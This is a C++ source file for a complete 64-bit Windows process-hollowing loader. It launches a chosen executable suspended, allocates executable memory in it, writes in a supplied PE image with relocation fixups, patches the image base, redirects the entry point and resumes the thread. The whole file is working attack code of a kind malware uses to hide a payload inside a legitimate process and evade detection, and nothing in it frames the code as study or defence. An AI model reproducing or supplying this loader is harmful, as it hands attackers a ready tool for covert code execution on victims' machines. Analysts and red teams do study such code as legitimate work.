#include "process_hollowing.hpp"

ProcessHollowing::HandleGuard::HandleGuard(HANDLE h) : m_handle(h) {}

ProcessHollowing::HandleGuard::~HandleGuard() { 
    if (m_handle) CloseHandle(m_handle); 
}

ProcessHollowing::ProcessHollowing(const std::vector<BYTE>& peBytes, const std::string& targetPath)
    : m_peBytes(peBytes), m_targetProcessPath(targetPath) {}

bool ProcessHollowing::Execute() {
    if (!IsValidPE()) {
        return false;
    }

    if (!CreateSuspendedProcess()) {
        return false;
    }

    const auto processInfo = GetProcessAddressInfo();
    if (!processInfo) {
        CleanupProcess(true);
        return false;
    }

    const auto targetSubsystem = GetTargetSubsystem(processInfo->imageBaseAddress);
    if (targetSubsystem == -1) {
        CleanupProcess(true);
        return false;
    }

    const auto sourceSubsystem = GetSourceSubsystem();

    if (sourceSubsystem != targetSubsystem) {
        CleanupProcess(true);
        return false;
    }

    const bool hasReloc = HasRelocation();

    bool success;
    if (hasReloc) {
        success = RunPEReloc64();
    } else {
        success = RunPE64();
    }

    if (success) {
        CleanupProcess(false);
        return true;
    }

    CleanupProcess(true);
    return false;
}

bool ProcessHollowing::CreateSuspendedProcess() {
    ZeroMemory(&m_startupInfo, sizeof(m_startupInfo));
    m_startupInfo.cb = sizeof(m_startupInfo);
    ZeroMemory(&m_processInfo, sizeof(m_processInfo));

    if (!CreateProcessA(m_targetProcessPath.c_str(), nullptr, nullptr, nullptr, TRUE,
        CREATE_SUSPENDED, nullptr, nullptr, &m_startupInfo, &m_processInfo)) {
        return false;
    }
    return true;
}

std::optional<ProcessHollowing::ProcessInfo> ProcessHollowing::GetProcessAddressInfo() {
    LPVOID imageBaseAddress = nullptr;
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(m_processInfo.hThread, &ctx)) {
        return std::nullopt;
    }

    if (!ReadProcessMemory(m_processInfo.hProcess, reinterpret_cast<LPVOID>(ctx.Rdx + 0x10),
        &imageBaseAddress, sizeof(UINT64), nullptr)) {
        return std::nullopt;
    }

    return ProcessInfo{ reinterpret_cast<LPVOID>(ctx.Rdx), imageBaseAddress };
}

DWORD ProcessHollowing::GetTargetSubsystem(LPVOID imageBaseAddress) {
    IMAGE_DOS_HEADER dosHeader{};
    if (!ReadProcessMemory(m_processInfo.hProcess, imageBaseAddress, &dosHeader, sizeof(IMAGE_DOS_HEADER), nullptr)) {
        return -1;
    }

    IMAGE_NT_HEADERS64 ntHeader{};
    if (!ReadProcessMemory(m_processInfo.hProcess, reinterpret_cast<LPVOID>(reinterpret_cast<uintptr_t>(imageBaseAddress) + dosHeader.e_lfanew),
        &ntHeader, sizeof(IMAGE_NT_HEADERS64), nullptr)) {
        return -1;
    }

    return ntHeader.OptionalHeader.Subsystem;
}

bool ProcessHollowing::IsValidPE() const {
    if (m_peBytes.size() < sizeof(IMAGE_DOS_HEADER)) {
        return false;
    }
    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(m_peBytes.data());
    auto ntHeader = reinterpret_cast<const IMAGE_NT_HEADERS*>(
        m_peBytes.data() + dosHeader->e_lfanew);
    return ntHeader->Signature == IMAGE_NT_SIGNATURE;
}

DWORD ProcessHollowing::GetSourceSubsystem() const {
    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(m_peBytes.data());
    auto ntHeader = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
        m_peBytes.data() + dosHeader->e_lfanew);
    return ntHeader->OptionalHeader.Subsystem;
}

bool ProcessHollowing::HasRelocation() const {
    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(m_peBytes.data());
    auto ntHeader = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
        m_peBytes.data() + dosHeader->e_lfanew);
    return ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0;
}

IMAGE_DATA_DIRECTORY ProcessHollowing::GetRelocAddress() const {
    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(m_peBytes.data());
    auto ntHeader = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
        m_peBytes.data() + dosHeader->e_lfanew);
    if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0) {
        return ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    }
    return { 0, 0 };
}

bool ProcessHollowing::RunPE64() {
    auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(m_peBytes.data());
    auto ntHeader = reinterpret_cast<const IMAGE_NT_HEADERS64*>(
        m_peBytes.data() + dosHeader->e_lfanew);

    auto allocAddress = VirtualAllocEx(m_processInfo.hProcess,
        reinterpret_cast<LPVOID>(ntHeader->OptionalHeader.ImageBase),
        ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!allocAddress) {
        return false;
    }

    if (!WriteProcessMemory(m_processInfo.hProcess, allocAddress, m_peBytes.data(),
        ntHeader->OptionalHeader.SizeOfHeaders, nullptr)) {
        return false;
    }

    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        auto sectionHeader = reinterpret_cast<const IMAGE_SECTION_HEADER*>(
            reinterpret_cast<const BYTE*>(ntHeader) + sizeof(IMAGE_NT_HEADERS64) +
            (i * sizeof(IMAGE_SECTION_HEADER)));

        if (!WriteProcessMemory(m_processInfo.hProcess,
            reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(allocAddress) + sectionHeader->VirtualAddress),
            m_peBytes.data() + sectionHeader->PointerToRawData,
            sectionHeader->SizeOfRawData, nullptr)) {
            return false;
        }
    }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(m_processInfo.hThread, &ctx)) {
        return false;
    }

    if (!WriteProcessMemory(m_processInfo.hProcess,
        reinterpret_cast<LPVOID>(ctx.Rdx + 0x10),
        &ntHeader->OptionalHeader.ImageBase,
        sizeof(DWORD64), nullptr)) {
        return false;
    }

    ctx.Rcx = reinterpret_cast<DWORD64>(allocAddress) + ntHeader->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(m_processInfo.hThread, &ctx)) {
        return false;
    }

    ResumeThread(m_processInfo.hThread);
    return true;
}

bool ProcessHollowing::RunPEReloc64() {
    auto dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(m_peBytes.data());
    auto ntHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(
        m_peBytes.data() + dosHeader->e_lfanew);

    auto allocAddress = VirtualAllocEx(m_processInfo.hProcess, nullptr,
        ntHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!allocAddress) {
        return false;
    }

    const auto deltaImageBase = reinterpret_cast<DWORD64>(allocAddress) - ntHeader->OptionalHeader.ImageBase;
    ntHeader->OptionalHeader.ImageBase = reinterpret_cast<DWORD64>(allocAddress);

    if (!WriteProcessMemory(m_processInfo.hProcess, allocAddress, m_peBytes.data(),
        ntHeader->OptionalHeader.SizeOfHeaders, nullptr)) {
        return false;
    }

    const auto imageDataReloc = GetRelocAddress();
    PIMAGE_SECTION_HEADER relocSection = nullptr;

    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        auto sectionHeader = reinterpret_cast<IMAGE_SECTION_HEADER*>(
            reinterpret_cast<BYTE*>(ntHeader) + sizeof(IMAGE_NT_HEADERS64) +
            (i * sizeof(IMAGE_SECTION_HEADER)));

        if (imageDataReloc.VirtualAddress >= sectionHeader->VirtualAddress &&
            imageDataReloc.VirtualAddress < (sectionHeader->VirtualAddress + sectionHeader->Misc.VirtualSize)) {
            relocSection = sectionHeader;
        }

        if (!WriteProcessMemory(m_processInfo.hProcess,
            reinterpret_cast<LPVOID>(reinterpret_cast<DWORD64>(allocAddress) + sectionHeader->VirtualAddress),
            m_peBytes.data() + sectionHeader->PointerToRawData,
            sectionHeader->SizeOfRawData, nullptr)) {
            return false;
        }
    }

    if (!relocSection) {
        return false;
    }

	struct RelocationEntry {
		WORD offset : 12;
		WORD type : 4;
	};

    DWORD relocOffset = 0;
    while (relocOffset < imageDataReloc.Size) {
        const auto baseRelocation = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
            reinterpret_cast<DWORD64>(m_peBytes.data()) + relocSection->PointerToRawData + relocOffset);
        relocOffset += sizeof(IMAGE_BASE_RELOCATION);

        const DWORD numEntries = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(RelocationEntry);
        for (DWORD i = 0; i < numEntries; i++) {
            const auto relocationEntry = reinterpret_cast<RelocationEntry*>(
                reinterpret_cast<DWORD64>(m_peBytes.data()) + relocSection->PointerToRawData + relocOffset);
            relocOffset += sizeof(RelocationEntry);

            if (relocationEntry->type == 0) continue;

            const DWORD64 addressLocation = reinterpret_cast<DWORD64>(allocAddress) +
                baseRelocation->VirtualAddress + relocationEntry->offset;
            DWORD64 patchedAddress = 0;

            ReadProcessMemory(m_processInfo.hProcess,
                reinterpret_cast<LPVOID>(addressLocation),
                &patchedAddress, sizeof(DWORD64), nullptr);

            patchedAddress += deltaImageBase;

            WriteProcessMemory(m_processInfo.hProcess,
                reinterpret_cast<LPVOID>(addressLocation),
                &patchedAddress, sizeof(DWORD64), nullptr);
        }
    }

    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(m_processInfo.hThread, &ctx)) {
        return false;
    }

    if (!WriteProcessMemory(m_processInfo.hProcess,
        reinterpret_cast<LPVOID>(ctx.Rdx + 0x10),
        &ntHeader->OptionalHeader.ImageBase,
        sizeof(DWORD64), nullptr)) {
        return false;
    }

    ctx.Rcx = reinterpret_cast<DWORD64>(allocAddress) + ntHeader->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(m_processInfo.hThread, &ctx)) {
        return false;
    }

    ResumeThread(m_processInfo.hThread);
    return true;
}

void ProcessHollowing::CleanupProcess(bool terminate) {
    if (m_processInfo.hThread) {
        CloseHandle(m_processInfo.hThread);
        m_processInfo.hThread = nullptr;
    }

    if (m_processInfo.hProcess) {
        if (terminate) {
            TerminateProcess(m_processInfo.hProcess, -1);
        }
        CloseHandle(m_processInfo.hProcess);
        m_processInfo.hProcess = nullptr;
    }
} 